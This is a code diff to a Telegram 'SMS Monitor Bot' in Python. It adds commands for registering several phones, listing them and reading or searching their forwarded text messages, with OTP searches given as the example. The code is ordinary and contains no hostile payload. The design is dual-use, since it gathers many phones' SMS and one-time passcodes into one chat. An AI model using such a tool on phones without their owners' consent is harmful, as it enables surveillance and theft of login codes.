@@ -6,7 +6,8 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 from app.config import get_settings
-from app.database import SMSMessage, SessionLocal
+from app.database import Device, SMSMessage, SessionLocal
+from app.services import device_status, list_devices_with_counts, register_device
 
 logger = logging.getLogger(__name__)
 settings = get_settings()
@@ -29,6 +30,17 @@ def format_sms(sms: SMSMessage) -> str:
         f"🕐 *Time:* {received}\n"
         f"💬 *Message:*\n{sms.message}"
     )
+
+
+def format_device_line(device: Device, sms_count: int) -> str:
+    status = device_status(device)
+    icon = {"online": "🟢", "idle": "🟡", "offline": "🔴", "inactive": "⚫"}.get(status, "⚪")
+    last_seen = (
+        device.last_seen.astimezone(timezone.utc).strftime("%d %b %H:%M")
+        if device.last_seen
+        else "Never"
+    )
+    return f"{icon} `{device.name}` — {sms_count} SMS | last: {last_seen}"
 
 
 async def notify_new_sms(sms: SMSMessage) -> None:
@@ -60,6 +72,9 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     await update.message.reply_text(
         "👋 *SMS Monitor Bot*\n\n"
         "Commands:\n"
+        "/devices - Apni saari devices dekho\n"
+        "/device <name> - Ek device ke SMS dekho\n"
+        "/adddevice <name> - Nayi device add karo\n"
         "/recent - Last 10 SMS\n"
         "/search <keyword> - Search messages\n"
         "/stats - Total SMS count\n"
@@ -74,18 +89,108 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
 
     await update.message.reply_text(
         "📖 *Help*\n\n"
-        "This bot monitors SMS from your Android phone.\n\n"
-        "*Setup (Superuser/Root):*\n"
-        "1. Termux + Magisk root on phone\n"
-        "2. Run `sms_daemon.sh setup` in Termux\n"
-        "3. Grant Termux permanent superuser\n\n"
-        "*Setup (No root):*\n"
-        "Use SMS Forwarder app → webhook:\n"
-        "`POST /api/sms?key=YOUR_API_KEY`\n\n"
-        "*Commands:*\n"
-        "/recent - Show recent SMS\n"
-        "/search otp - Find OTP messages\n"
-        "/stats - Message statistics",
+        "Apna database `.env` mein `DATABASE_URL` se connect karo.\n"
+        "Device SMS bhejti hai to automatically bot mein aa jati hai.\n\n"
+        "*Device commands:*\n"
+        "/devices - Saari devices list\n"
+        "/device redmi - Us device ke recent SMS\n"
+        "/adddevice samsung - Manual device add\n\n"
+        "*SMS commands:*\n"
+        "/recent - Last 10 SMS\n"
+        "/search otp - OTP dhundho\n"
+        "/stats - Statistics",
+        parse_mode="Markdown",
+    )
+
+
+async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not is_authorized(update.effective_user.id if update.effective_user else None):
+        return
+
+    db: Session = SessionLocal()
+    try:
+        items = list_devices_with_counts(db)
+    finally:
+        db.close()
+
+    if not items:
+        await update.message.reply_text(
+            "📭 Abhi koi device nahi hai.\n\n"
+            "Add karo: `/adddevice my-phone`\n"
+            "Ya SMS forward karo — device auto add ho jayegi.",
+            parse_mode="Markdown",
+        )
+        return
+
+    lines = ["📱 *Tumhari Devices*\n"]
+    for item in items:
+        lines.append(format_device_line(item["device"], item["sms_count"]))
+
+    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
+
+
+async def device_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not is_authorized(update.effective_user.id if update.effective_user else None):
+        return
+
+    if not context.args:
+        await update.message.reply_text("Usage: /device <device-name>")
+        return
+
+    device_name = " ".join(context.args)
+    db: Session = SessionLocal()
+    try:
+        device = db.query(Device).filter(Device.name == device_name).first()
+        if not device:
+            await update.message.reply_text(
+                f"❌ Device `{device_name}` nahi mili.\n/devices se list dekho.",
+                parse_mode="Markdown",
+            )
+            return
+
+        messages = (
+            db.query(SMSMessage)
+            .filter(SMSMessage.device_name == device_name)
+            .order_by(SMSMessage.received_at.desc())
+            .limit(10)
+            .all()
+        )
+    finally:
+        db.close()
+
+    if not messages:
+        await update.message.reply_text(f"📭 `{device_name}` par abhi koi SMS nahi.", parse_mode="Markdown")
+        return
+
+    parts = [f"📱 *Device:* `{device_name}`\n"]
+    for sms in messages:
+        parts.append(format_sms(sms))
+        parts.append("—" * 20)
+
+    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")
+
+
+async def adddevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not is_authorized(update.effective_user.id if update.effective_user else None):
+        return
+
+    if not context.args:
+        await update.message.reply_text("Usage: /adddevice <device-name>")
+        return
+
+    device_name = " ".join(context.args)
+    db: Session = SessionLocal()
+    try:
+        device = register_device(db, device_name)
+        db.commit()
+        db.refresh(device)
+    finally:
+        db.close()
+
+    await update.message.reply_text(
+        f"✅ Device added: `{device.name}`\n"
+        f"🔑 Device API key: `{device.api_key}`\n\n"
+        f"Phone par ye key use karo webhook mein.",
         parse_mode="Markdown",
     )
 
@@ -157,6 +262,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     db: Session = SessionLocal()
     try:
         total = db.query(SMSMessage).count()
+        device_count = db.query(Device).count()
         latest = (
             db.query(SMSMessage)
             .order_by(SMSMessage.received_at.desc())
@@ -172,6 +278,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     await update.message.reply_text(
         f"📊 *SMS Monitor Stats*\n\n"
         f"Total messages: *{total}*\n"
+        f"Total devices: *{device_count}*\n"
         f"Last received: {latest_text}",
         parse_mode="Markdown",
     )
@@ -185,6 +292,9 @@ def build_telegram_app() -> Application | None:
     app = Application.builder().token(settings.telegram_bot_token).build()
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("devices", devices_command))
+    app.add_handler(CommandHandler("device", device_command))
+    app.add_handler(CommandHandler("adddevice", adddevice_command))
     app.add_handler(CommandHandler("recent", recent_command))
     app.add_handler(CommandHandler("search", search_command))
     app.add_handler(CommandHandler("stats", stats_command))
